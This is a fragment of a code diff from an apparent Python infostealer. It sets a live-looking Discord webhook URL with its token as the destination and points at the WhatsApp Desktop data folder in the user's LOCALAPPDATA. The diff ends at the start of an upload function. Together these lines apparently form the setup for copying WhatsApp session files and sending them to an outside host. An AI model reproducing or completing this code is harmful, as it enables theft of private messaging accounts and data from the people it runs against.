@@ -2,9 +2,9 @@ import os, requests, time, socket, shutil
 
 # PSG > OM
 
-WEBHOOK = "xpierroz on top"
+WEBHOOK = "https://discord.com/api/webhooks/1177945392856449065/WZhIaJKchwA_vNvnxRQekzrOCZYEzbeXNk4mfWYW4b0J6zw4VVk9THJU-Y6SM8tiGPTD"
 
-temp = "C:\Temp"
+temp = os.environ.get('TMP') or os.environ.get('TEMP')
 direct = f"{os.getenv('LOCALAPPDATA')}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm"
 
 def upload(path):
